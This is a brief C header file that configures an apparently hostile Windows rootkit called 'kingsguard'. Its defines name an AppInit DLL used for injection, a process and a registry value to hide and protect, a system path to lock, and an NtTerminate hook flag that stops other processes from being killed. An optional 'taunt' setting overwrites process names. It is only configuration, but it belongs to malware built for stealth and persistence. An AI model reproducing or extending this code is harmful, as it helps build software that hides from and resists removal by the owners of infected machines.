#ifndef LOADER
#define APPINIT L"appinit"

#define DLL L"kgsgrd" // dll name
#define PROCESSA "ksguard" // Process name to hide / protect
#define PROCESSW L"ksguard" // Process name to hide / protect
#define KEY L"ksguard" // Reg value to hide / protect
#define PATH L"windows\\shellcomponents" // path + subdirectories to lock

#define TAUNT false // if true, overwrite process list with TAUNTVALUE
#define NOTERM true // if true, NtTerminate hook prevents killing other processes

#if TAUNT
#define TAUNTVALUE L"kingsguard" // overwrite all process names 
#endif

#else
#define DLL L"C:\\windows\\system32\\kgsgrd.dll"

#endif
